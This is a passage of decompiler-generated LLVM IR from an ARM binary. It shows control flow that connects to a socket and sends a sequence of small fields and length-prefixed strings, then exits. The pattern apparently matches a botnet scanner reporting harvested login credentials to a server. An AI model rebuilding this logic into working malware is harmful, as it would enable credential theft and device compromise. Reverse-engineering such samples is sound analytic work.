  %v2_12da0 = inttoptr i32 %v1_12da0 to i8*
  %v3_12da0 = load i8, i8* %v2_12da0, align 1
  %v4_12da0 = zext i8 %v3_12da0 to i32
  %v1_12da4 = add nuw nsw i32 %v4_12da0, 1
  %v1_12da8 = urem i32 %v1_12da4, 256
  store i32 %v1_12da8, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  %v2_12db0 = icmp ugt i32 %v1_12da8, 9
  store i1 %v2_12db0, i1* %cpsr_c.global-to-local, align 1
  %v7_12db0 = icmp eq i32 %v1_12da8, 10
  store i1 %v7_12db0, i1* %cpsr_z.global-to-local, align 1
  %v2_12db4 = add i32 %v0_12da0, 4
  %v3_12db4 = inttoptr i32 %v2_12db4 to i32*
  store i32 -1, i32* %v3_12db4, align 4
  %v0_12db8 = load i32, i32* %r3.global-to-local, align 4
  %v1_12db8 = trunc i32 %v0_12db8 to i8
  %v2_12db8 = load i32, i32* @r5, align 4
  %v3_12db8 = add i32 %v2_12db8, 284
  %v4_12db8 = inttoptr i32 %v3_12db8 to i8*
  store i8 %v1_12db8, i8* %v4_12db8, align 1
  %v0_12dbc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_12dc0 = load i32, i32* @r5, align 4
  br i1 %v0_12dbc, label %dec_label_pc_12dc0, label %dec_label_pc_12ea8

dec_label_pc_12dc0:                               ; preds = %dec_label_pc_12d90
  %v1_12dc0 = add i32 %v0_12dc0, 24
  %v2_12dc0 = inttoptr i32 %v1_12dc0 to i32*
  %v3_12dc0 = load i32, i32* %v2_12dc0, align 4
  store i32 %v3_12dc0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v3_12dd0 = add i32 %v0_12dc0, 284
  %v4_12dd0 = inttoptr i32 %v3_12dd0 to i8*
  store i8 0, i8* %v4_12dd0, align 1
  %v0_12dd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_12dd4 = load i32, i32* @r5, align 4
  %v2_12dd4 = add i32 %v1_12dd4, 12
  %v3_12dd4 = inttoptr i32 %v2_12dd4 to i32*
  store i32 %v0_12dd4, i32* %v3_12dd4, align 4
  br label %dec_label_pc_12c58

dec_label_pc_12ddc:                               ; preds = %dec_label_pc_124a0
  br i1 %v2_124c8, label %dec_label_pc_12efc, label %dec_label_pc_12de0

dec_label_pc_12de0:                               ; preds = %dec_label_pc_12ddc
  %v3_12de0 = icmp eq i32 %v4_124c4, -1
  store i1 %v3_12de0, i1* %cpsr_c.global-to-local, align 1
  %v8_12de0 = icmp eq i32 %v4_124c4, -1
  store i1 %v8_12de0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12de0, label %dec_label_pc_12de8, label %dec_label_pc_124f0

dec_label_pc_12de8:                               ; preds = %dec_label_pc_12de0
  store i32 %v2_11f80, i32* %r2.global-to-local, align 4
  %v2_12dec = load i32, i32* %v0_11f80, align 4
  store i32 %v2_12dec, i32* %r3.global-to-local, align 4
  %v2_12df0 = icmp ugt i32 %v2_12dec, 10
  store i1 %v2_12df0, i1* %cpsr_c.global-to-local, align 1
  %v7_12df0 = icmp eq i32 %v2_12dec, 11
  store i1 %v7_12df0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12df0, label %dec_label_pc_12320, label %dec_label_pc_12df8

dec_label_pc_12df8:                               ; preds = %dec_label_pc_12de8, %dec_label_pc_12efc
  %v0_12df8 = load i32, i32* @r5, align 4
  %v1_12df8 = add i32 %v0_12df8, 4
  %v2_12df8 = inttoptr i32 %v1_12df8 to i32*
  %v3_12df8 = load i32, i32* %v2_12df8, align 4
  store i32 %v3_12df8, i32* %r0.global-to-local, align 4
  %v1_12dfc = call i32 @close(i32 %v3_12df8)
  store i32 %v1_12dfc, i32* %r0.global-to-local, align 4
  %v0_12e00 = load i32, i32* @r5, align 4
  %v1_12e00 = add i32 %v0_12e00, 284
  %v2_12e00 = inttoptr i32 %v1_12e00 to i8*
  %v3_12e00 = load i8, i8* %v2_12e00, align 1
  %v4_12e00 = zext i8 %v3_12e00 to i32
  %v1_12e04 = add nuw nsw i32 %v4_12e00, 1
  %v1_12e08 = urem i32 %v1_12e04, 256
  store i32 %v1_12e08, i32* %r3.global-to-local, align 4
  %v2_12e0c = icmp ugt i32 %v1_12e08, 8
  store i1 %v2_12e0c, i1* %cpsr_c.global-to-local, align 1
  %v7_12e0c = icmp eq i32 %v1_12e08, 9
  store i1 %v7_12e0c, i1* %cpsr_z.global-to-local, align 1
  %v1_12e10 = trunc i32 %v1_12e04 to i8
  store i8 %v1_12e10, i8* %v2_12e00, align 1
  store i32 -1, i32* @r4, align 4
  %v0_12e18 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_12e18 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_12e18 = xor i1 %v1_12e18, true
  %v3_12e18 = and i1 %v0_12e18, %v2_12e18
  br i1 %v3_12e18, label %bb347, label %.thread218

.thread218:                                       ; preds = %dec_label_pc_12df8
  %v1_12e1c214219 = load i32, i32* @r5, align 4
  %v2_12e1c215220 = add i32 %v1_12e1c214219, 4
  %v3_12e1c216221 = inttoptr i32 %v2_12e1c215220 to i32*
  store i32 -1, i32* %v3_12e1c216221, align 4
  br label %bb348

bb347:                                            ; preds = %dec_label_pc_12df8
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12e1c210 = load i32, i32* @r5, align 4
  %v2_12e1c211 = add i32 %v1_12e1c210, 4
  %v3_12e1c212 = inttoptr i32 %v2_12e1c211 to i32*
  store i32 -1, i32* %v3_12e1c212, align 4
  %v4_12e20 = load i32, i32* %r3.global-to-local, align 4
  %v5_12e20 = load i32, i32* @r5, align 4
  %v6_12e20 = add i32 %v5_12e20, 12
  %v7_12e20 = inttoptr i32 %v6_12e20 to i32*
  store i32 %v4_12e20, i32* %v7_12e20, align 4
  %v4_12e24 = load i32, i32* %r3.global-to-local, align 4
  %v5_12e24 = trunc i32 %v4_12e24 to i8
  %v6_12e24 = load i32, i32* @r5, align 4
  %v7_12e24 = add i32 %v6_12e24, 284
  %v8_12e24 = inttoptr i32 %v7_12e24 to i8*
  store i8 %v5_12e24, i8* %v8_12e24, align 1
  %v0_12e28.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_12e28.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb348

bb348:                                            ; preds = %.thread218, %bb347
  %v1_12e28 = phi i1 [ %v1_12e28.pre, %bb347 ], [ %v1_12e18, %.thread218 ]
  %v0_12e28 = phi i1 [ %v0_12e28.pre, %bb347 ], [ %v0_12e18, %.thread218 ]
  %v2_12e28 = xor i1 %v1_12e28, true
  %v3_12e28 = and i1 %v0_12e28, %v2_12e28
  br i1 %v3_12e28, label %dec_label_pc_12320, label %dec_label_pc_12e2c

dec_label_pc_12e2c:                               ; preds = %bb348
  %v0_12e2c = load i32, i32* @r5, align 4
  store i32 %v0_12e2c, i32* @r0, align 4
  %v0_12e30 = call i32 @function_1141c()
  store i32 %v0_12e30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12320

dec_label_pc_12e38:                               ; preds = %dec_label_pc_127e8, %dec_label_pc_127c4, %dec_label_pc_12804
  store i32 %v3_127c4, i32* %r1.global-to-local, align 4
  %v0_12e3c = load i32, i32* @sb, align 4
  store i32 %v0_12e3c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_14644.391 to i32), i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v5_12e48 = call i32 @function_13b18(i32 %v0_12e3c, i32 %v3_127c4, i32 ptrtoint ([8 x i8]* @global_var_14644.391 to i32), i32 7)
  store i32 %v5_12e48, i32* %r0.global-to-local, align 4
  %v3_12e4c = icmp eq i32 %v5_12e48, -1
  store i1 %v3_12e4c, i1* %cpsr_c.global-to-local, align 1
  %v8_12e4c = icmp eq i32 %v5_12e48, -1
  store i1 %v8_12e4c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_12e48, i32* @r7, align 4
  br i1 %v3_12e4c, label %dec_label_pc_12484.loopexit, label %dec_label_pc_12810

dec_label_pc_12e5c:                               ; preds = %dec_label_pc_12d68
  store i32 %v2_12550, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_12e68 = add i32 %v0_12d54, 4
  %v2_12e68 = inttoptr i32 %v1_12e68 to i32*
  %v3_12e68 = load i32, i32* %v2_12e68, align 4
  store i32 %v3_12e68, i32* %r0.global-to-local, align 4
  %v4_12e6c = call i32 @_send(i32 %v3_12e68, i32 %v2_12550, i32 3, i32 16384)
  store i32 %v4_12e6c, i32* %r0.global-to-local, align 4
  store i32 %v2_12d40, i32* %r1.global-to-local, align 4
  %v0_12e74 = load i32, i32* @r5, align 4
  %v1_12e74 = add i32 %v0_12e74, 4
  %v2_12e74 = inttoptr i32 %v1_12e74 to i32*
  %v3_12e74 = load i32, i32* %v2_12e74, align 4
  store i32 %v3_12e74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125e8

dec_label_pc_12e84:                               ; preds = %dec_label_pc_12490
  store i32 %.pre, i32* %r0.global-to-local, align 4
  %v1_12e8c = add i32 %v0_12e84, 92
  store i32 %v1_12e8c, i32* %r1.global-to-local, align 4
  store i32 192, i32* %r2.global-to-local, align 4
  %v3_12e94 = call i32 @_memmove(i32 %.pre, i32 %v1_12e8c, i32 192)
  store i32 %v3_12e94, i32* %r0.global-to-local, align 4
  %v0_12e98 = load i32, i32* @r5, align 4
  %v1_12e98 = add i32 %v0_12e98, 24
  %v2_12e98 = inttoptr i32 %v1_12e98 to i32*
  %v3_12e98 = load i32, i32* %v2_12e98, align 4
  store i32 %v3_12e98, i32* %r3.global-to-local, align 4
  %v1_12e9c = add i32 %v3_12e98, -64
  store i32 %v1_12e9c, i32* %ip.global-to-local, align 4
  store i32 %v1_12e9c, i32* %v2_12e98, align 4
  br label %dec_label_pc_124a0

dec_label_pc_12ea8:                               ; preds = %dec_label_pc_12d90
  store i32 %v0_12dc0, i32* @r0, align 4
  %v0_12eac = call i32 @function_1141c()
  store i32 %v0_12eac, i32* %r0.global-to-local, align 4
  %v0_12eb0 = load i32, i32* @r5, align 4
  %v1_12eb0 = add i32 %v0_12eb0, 24
  %v2_12eb0 = inttoptr i32 %v1_12eb0 to i32*
  %v3_12eb0 = load i32, i32* %v2_12eb0, align 4
  store i32 %v3_12eb0, i32* %ip.global-to-local, align 4
  %v0_12eb4 = load i32, i32* @r4, align 4
  store i32 %v0_12eb4, i32* @r7, align 4
  br label %dec_label_pc_12c58

dec_label_pc_12ebc:                               ; preds = %dec_label_pc_12278, %dec_label_pc_1225c
  %v0_12ebc = load i32, i32* @r7, align 4
  %v1_12ebc = load i32, i32* @r4, align 4
  %v2_12ebc = add i32 %v1_12ebc, 12
  %v3_12ebc = inttoptr i32 %v2_12ebc to i32*
  store i32 %v0_12ebc, i32* %v3_12ebc, align 4
  %v0_12ec0 = load i32, i32* @r7, align 4
  %v1_12ec0 = trunc i32 %v0_12ec0 to i8
  %v2_12ec0 = load i32, i32* @r4, align 4
  %v3_12ec0 = add i32 %v2_12ec0, 284
  %v4_12ec0 = inttoptr i32 %v3_12ec0 to i8*
  store i8 %v1_12ec0, i8* %v4_12ec0, align 1
  br label %bb309

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12404, %dec_label_pc_123bc
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12ecc

dec_label_pc_12ecc:                               ; preds = %dec_label_pc_1242c, %dec_label_pc_12ec8
  %v0_12ed4 = phi i32 [ 0, %dec_label_pc_12ec8 ], [ %v0_1240c, %dec_label_pc_1242c ]
  %v0_12ecc = load i32, i32* @r5, align 4
  %v1_12ecc = add i32 %v0_12ecc, 4
  %v2_12ecc = inttoptr i32 %v1_12ecc to i32*
  %v3_12ecc = load i32, i32* %v2_12ecc, align 4
  store i32 %v3_12ecc, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_12ed4 = inttoptr i32 %v0_12ecc to i32*
  store i32 %v0_12ed4, i32* %v2_12ed4, align 4
  %v0_12ed8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ed8 = load i32, i32* @r5, align 4
  %v2_12ed8 = add i32 %v1_12ed8, 24
  %v3_12ed8 = inttoptr i32 %v2_12ed8 to i32*
  store i32 %v0_12ed8, i32* %v3_12ed8, align 4
  %v0_122fc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_122fc

dec_label_pc_12ee0:                               ; preds = %dec_label_pc_1237c
  %v0_12ee0 = load i32, i32* @r5, align 4
  %v1_12ee0 = add i32 %v0_12ee0, 4
  %v2_12ee0 = inttoptr i32 %v1_12ee0 to i32*
  %v3_12ee0 = load i32, i32* %v2_12ee0, align 4
  store i32 %v3_12ee0, i32* %r0.global-to-local, align 4
  %v1_12ee4 = call i32 @close(i32 %v3_12ee0)
  store i32 %v1_12ee4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v0_12eec = load i32, i32* @r6, align 4
  %v1_12eec = load i32, i32* @r5, align 4
  %v2_12eec = add i32 %v1_12eec, 12
  %v3_12eec = inttoptr i32 %v2_12eec to i32*
  store i32 %v0_12eec, i32* %v3_12eec, align 4
  %v0_12ef0 = load i32, i32* %r4.global-to-local, align 4
  %v1_12ef0 = load i32, i32* @r5, align 4
  %v2_12ef0 = add i32 %v1_12ef0, 4
  %v3_12ef0 = inttoptr i32 %v2_12ef0 to i32*
  store i32 %v0_12ef0, i32* %v3_12ef0, align 4
  %v0_12ef4 = load i32, i32* @r6, align 4
  %v1_12ef4 = trunc i32 %v0_12ef4 to i8
  %v2_12ef4 = load i32, i32* @r5, align 4
  %v3_12ef4 = add i32 %v2_12ef4, 284
  %v4_12ef4 = inttoptr i32 %v3_12ef4 to i8*
  store i8 %v1_12ef4, i8* %v4_12ef4, align 1
  br label %dec_label_pc_12320

dec_label_pc_12efc:                               ; preds = %dec_label_pc_12ddc
  store i32 %v2_11f80, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v0_11f80, align 4
  br label %dec_label_pc_12df8

dec_label_pc_12f0c:                               ; preds = %dec_label_pc_12c14
  store i32 2, i32* @r5, align 4
  %v1_12f10 = add i32 %v2_12c30, 4
  %v2_12f10 = inttoptr i32 %v1_12f10 to i32*
  %v3_12f10 = load i32, i32* %v2_12f10, align 4
  store i32 %v3_12f10, i32* @r4, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v0_12f1c = call i32 @function_10bd8()
  store i32 %v0_12f1c, i32* %r0.global-to-local, align 4
  %v0_12f20 = load i32, i32* @r8, align 4
  %v1_12f20 = inttoptr i32 %v0_12f20 to i8*
  %v2_12f20 = load i8, i8* %v1_12f20, align 1
  %v3_12f20 = zext i8 %v2_12f20 to i32
  store i32 %v3_12f20, i32* %r1.global-to-local, align 4
  %v2_12f24 = urem i32 %v0_12f1c, %v3_12f20
  store i32 %v2_12f24, i32* %r0.global-to-local, align 4
  %v0_12f28 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_12f28 = mul nuw nsw i32 %v2_12f24, 4
  %v5_12f28 = add i32 %v0_12f28, %v4_12f28
  %v6_12f28 = inttoptr i32 %v5_12f28 to i32*
  %v7_12f28 = load i32, i32* %v6_12f28, align 4
  store i32 %v7_12f28, i32* %r3.global-to-local, align 4
  %v0_12f2c = load i32, i32* @sl, align 4
  store i32 %v0_12f2c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v2_12f38 = inttoptr i32 %v0_12f2c to i32*
  %v3_12f38 = call i32 @function_13044(i32 19, i32* %v2_12f38)
  %v4_12f38 = inttoptr i32 %v3_12f38 to i8*
  store i32 %v3_12f38, i32* %r0.global-to-local, align 4
  %v2_12f3c = add i32 %v3_12f38, 1
  %v3_12f3c = inttoptr i32 %v2_12f3c to i8*
  %v4_12f3c = load i8, i8* %v3_12f3c, align 1
  %v5_12f3c = zext i8 %v4_12f3c to i32
  store i32 %v5_12f3c, i32* %r2.global-to-local, align 4
  %v3_12f40 = load i8, i8* %v4_12f38, align 1
  %v4_12f40 = zext i8 %v3_12f40 to i32
  %v4_12f44 = mul nuw nsw i32 %v5_12f3c, 256
  %v5_12f44 = or i32 %v4_12f40, %v4_12f44
  store i32 %v5_12f44, i32* %r3.global-to-local, align 4
  %v1_12f48 = and i32 %v4_12f40, 128
  %v2_12f48 = icmp ne i32 %v1_12f48, 0
  store i1 %v2_12f48, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_12f3c, i32* %r1.global-to-local, align 4
  %v0_12f4c = load i32, i32* @r8, align 4
  store i32 %v0_12f4c, i32* %r0.global-to-local, align 4
  %v2_12f58 = sext i8 %v4_12f3c to i32
  %v7_12f58 = inttoptr i32 %v0_12f4c to i32*
  %v8_12f58 = call i32 @function_10e98(i32* %v7_12f58, i32 %v2_12f58)
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_12f60 = call i32 @function_13070(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_12f68 = call i32 @function_13070(i32 19)
  %v0_12f70 = load i32, i32* @r6, align 4
  store i32 %v0_12f70, i32* @r0, align 4
  store i32 %v2_11f50, i32* @r1, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_12f7c = call i32 @_connect(i32 %v0_12f70, i32 %v2_11f50, i32 16)
  store i32 %v3_12f7c, i32* %r0.global-to-local, align 4
  %v3_12f80 = icmp eq i32 %v3_12f7c, -1
  store i1 %v3_12f80, i1* %cpsr_c.global-to-local, align 1
  %v8_12f80 = icmp eq i32 %v3_12f7c, -1
  store i1 %v8_12f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12f80, label %dec_label_pc_12f88, label %dec_label_pc_12f98

dec_label_pc_12f88:                               ; preds = %dec_label_pc_12f0c
  %v0_12f88 = load i32, i32* @r6, align 4
  store i32 %v0_12f88, i32* %r0.global-to-local, align 4
  %v1_12f8c = call i32 @close(i32 %v0_12f88)
  %v0_12f90 = load i32, i32* @sl, align 4
  store i32 %v0_12f90, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_12f90)
  unreachable

dec_label_pc_12f98:                               ; preds = %dec_label_pc_12f0c
  store i32 %v2_128bc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12fa8 = load i32, i32* @r6, align 4
  store i32 %v0_12fa8, i32* %r0.global-to-local, align 4
  %v0_12fac = load i32, i32* @sl, align 4
  store i32 %v0_12fac, i32* %stack_var_-56, align 4
  %v5_12fb0 = call i32 @_send(i32 %v0_12fa8, i32 %v2_128bc, i32 1, i32 16384)
  store i32 %v2_12970, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12fc4 = load i32, i32* @r6, align 4
  store i32 %v0_12fc4, i32* %r0.global-to-local, align 4
  %v4_12fc8 = call i32 @_send(i32 %v0_12fc4, i32 %v2_12970, i32 4, i32 16384)
  %v0_12fd0 = load i32, i32* @r5, align 4
  store i32 %v0_12fd0, i32* %r2.global-to-local, align 4
  %v2_12fd4 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_12fd4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12fdc = load i32, i32* @r6, align 4
  store i32 %v0_12fdc, i32* %r0.global-to-local, align 4
  %v4_12fe0 = call i32 @_send(i32 %v0_12fdc, i32 %v2_12fd4, i32 %v0_12fd0, i32 16384)
  %v0_12fe4 = load i32, i32* @fp, align 4
  %v1_12fe4 = add i32 %v0_12fe4, 12
  store i32 %v1_12fe4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12ff0 = load i32, i32* @r6, align 4
  store i32 %v0_12ff0, i32* %r0.global-to-local, align 4
  %v4_12ff4 = call i32 @_send(i32 %v0_12ff0, i32 %v1_12fe4, i32 1, i32 16384)
  store i32 %v4_12ff4, i32* %r0.global-to-local, align 4
  %v0_12ff8 = load i32, i32* @fp, align 4
  %v1_12ff8 = inttoptr i32 %v0_12ff8 to i32*
  %v2_12ff8 = load i32, i32* %v1_12ff8, align 4
  store i32 %v2_12ff8, i32* %r1.global-to-local, align 4
  %v1_12ffc = add i32 %v0_12ff8, 12
  %v2_12ffc = inttoptr i32 %v1_12ffc to i8*
  %v3_12ffc = load i8, i8* %v2_12ffc, align 1
  %v4_12ffc = zext i8 %v3_12ffc to i32
  store i32 %v4_12ffc, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13004 = load i32, i32* @r6, align 4
  store i32 %v0_13004, i32* %r0.global-to-local, align 4
  %v4_13008 = call i32 @_send(i32 %v0_13004, i32 %v2_12ff8, i32 %v4_12ffc, i32 16384)
  %v0_1300c = load i32, i32* @fp, align 4
  %v1_1300c = add i32 %v0_1300c, 13
  store i32 %v1_1300c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13018 = load i32, i32* @r6, align 4
  store i32 %v0_13018, i32* %r0.global-to-local, align 4
  %v4_1301c = call i32 @_send(i32 %v0_13018, i32 %v1_1300c, i32 1, i32 16384)
  %v0_13020 = load i32, i32* @r6, align 4
  store i32 %v0_13020, i32* %r0.global-to-local, align 4
  %v0_13024 = load i32, i32* @fp, align 4
  %v1_13024 = add i32 %v0_13024, 13
  %v2_13024 = inttoptr i32 %v1_13024 to i8*
  %v3_13024 = load i8, i8* %v2_13024, align 1
  %v4_13024 = zext i8 %v3_13024 to i32
  store i32 %v4_13024, i32* %r2.global-to-local, align 4
  %v1_13028 = add i32 %v0_13024, 4
  %v2_13028 = inttoptr i32 %v1_13028 to i32*
  %v3_13028 = load i32, i32* %v2_13028, align 4
  store i32 %v3_13028, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_13030 = call i32 @_send(i32 %v0_13020, i32 %v3_13028, i32 %v4_13024, i32 16384)
  %v0_13034 = load i32, i32* @r6, align 4
  store i32 %v0_13034, i32* %r0.global-to-local, align 4
  %v1_13038 = call i32 @close(i32 %v0_13034)
  store i32 %v1_13038, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1303c

dec_label_pc_1303c:                               ; preds = %dec_label_pc_12bf8, %dec_label_pc_12f98
  %v0_1303c = load i32, i32* @sl, align 4
  store i32 %v0_1303c, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_1303c)
  unreachable

; uselistorder directives
  uselistorder i32 %v4_12f40, { 1, 0 }
  uselistorder i32 %v5_12f3c, { 1, 0, 2 }
  uselistorder i32 %v3_12e74, { 1, 0 }
  uselistorder i32 %v5_12e48, { 2, 0, 3, 4, 1 }
  uselistorder i1 %v1_12e18, { 1, 0 }
  uselistorder i32 %v1_12e08, { 2, 1, 0 }
  uselistorder i32 %v1_12e04, { 1, 0 }
  uselistorder i32 %v0_12dc0, { 1, 0, 2 }
  uselistorder i32 %v1_12da8, { 2, 1, 0 }
  uselistorder i32 %v0_12d54, { 1, 2, 0 }
  uselistorder i1 %v7_12cc8, { 1, 0 }
  uselistorder i32 %v1_12cc4, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_12cbc, { 1, 0 }
  uselistorder i8 %v3_12cb4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12cc4, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_12ca0, { 1, 0 }
  uselistorder i1 %v7_12c98, { 1, 0 }
  uselistorder i1 %v7_12c90, { 1, 0 }
  uselistorder i32 %v0_12c6c, { 1, 2, 0 }
  uselistorder i32 %v2_12c58, { 1, 0 }
  uselistorder i32 %v1_12c58, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_12c58, { 3, 2, 5, 0, 1, 4, 6 }
  uselistorder i1 %v7_12c08, { 1, 0 }
  uselistorder i32 %v3_12c04, { 1, 0, 2, 3 }
  uselistorder i1 %v2_12bf0, { 1, 0 }
  uselistorder i32 %.352, { 1, 0 }
  uselistorder i1 %v7_12bd8, { 1, 0 }
  uselistorder i32 %v0_12bd4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_12bb4, { 1, 0, 2 }
  uselistorder i32 %v4_12bb0, { 1, 0, 2 }
  uselistorder i1 %v7_12ba0, { 1, 0 }
  uselistorder i32 %v0_12ba0, { 3, 2, 0, 4, 1 }
  uselistorder i1 %v7_12abc, { 1, 0 }
  uselistorder i32 %v1_12ab8, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_12ab0, { 1, 0 }
  uselistorder i8 %v3_12aa8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12ab8, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_12a94, { 1, 0 }
  uselistorder i1 %v7_12a8c, { 1, 0 }
  uselistorder i1 %v7_12a84, { 1, 0 }
  uselistorder i1 %v7_12a08, { 1, 0 }
  uselistorder i32 %v1_12a04, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_129fc, { 1, 0 }
  uselistorder i8 %v3_129f4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12a04, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_129e0, { 1, 0 }
  uselistorder i1 %v7_129d8, { 1, 0 }
  uselistorder i1 %v7_129d0, { 1, 0 }
  uselistorder i1 %v7_12954, { 1, 0 }
  uselistorder i32 %v1_12950, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_12948, { 1, 0 }
  uselistorder i8 %v3_12940, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12950, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_1292c, { 1, 0 }
  uselistorder i1 %v7_12924, { 1, 0 }
  uselistorder i1 %v7_1291c, { 1, 0 }
  uselistorder i1 %v7_128a0, { 1, 0 }
  uselistorder i32 %v1_1289c, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_12894, { 1, 0 }
  uselistorder i8 %v3_1288c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1289c, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_12878, { 1, 0 }
  uselistorder i1 %v7_12870, { 1, 0 }
  uselistorder i1 %v7_12868, { 1, 0 }
  uselistorder i32 %v0_12810, { 2, 1, 0 }
  uselistorder i1 %v7_12808, { 1, 0 }
  uselistorder i1 %v8_127fc, { 1, 0 }
  uselistorder i8 %v3_127f4, { 4, 5, 6, 7, 8, 3, 2, 1, 0 }
  uselistorder i32 %v0_12804, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_127e0, { 1, 0 }
  uselistorder i1 %v7_127d8, { 1, 0 }
  uselistorder i32 %v3_127c4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12780, { 2, 1, 0 }
  uselistorder i1 %v7_12778, { 1, 0 }
  uselistorder i1 %v8_1276c, { 1, 0 }
  uselistorder i8 %v3_12764, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12774, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_12750, { 1, 0 }
  uselistorder i1 %v7_12748, { 1, 0 }
  uselistorder i1 %v7_12740, { 1, 0 }
  uselistorder i32 %v3_12628, { 2, 3, 0, 1 }
  uselistorder i32 %v0_12618.pre, { 0, 2, 1 }
  uselistorder i32 %v1_12600, { 1, 0 }
  uselistorder i32 %v1_125fc, { 1, 0 }
  uselistorder i32 %v1_125f4, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_125f0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_125f0, { 0, 2, 1 }
  uselistorder i1 %v7_12598, { 1, 0 }
  uselistorder i1 %v2_12584, { 1, 0, 2 }
  uselistorder i1 %v2_1256c, { 1, 0, 2 }
  uselistorder i32 %v1_1258c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_12560, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v1_12588, { 1, 0 }
  uselistorder i32 %v2_12590, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_12508, { 4, 19, 5, 17, 6, 18, 7, 16, 8, 15, 9, 14, 10, 13, 3, 0, 11, 12, 20, 2, 1 }
  uselistorder i32 %v1_124e4, { 1, 2, 3, 0 }
  uselistorder i32 %v3_124e0, { 1, 0 }
  uselistorder i32 %v4_124c4, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_124b0, { 1, 0, 2 }
  uselistorder i32 %v3_124ac, { 1, 0, 2 }
  uselistorder i32 %v0_12e84, { 1, 0, 2 }
  uselistorder i32 %v5_12474, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_12454, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1240c, { 0, 3, 2, 4, 6, 5, 1 }
  uselistorder i32 %v2_123e0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_123d8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_1236c, { 2, 1, 0 }
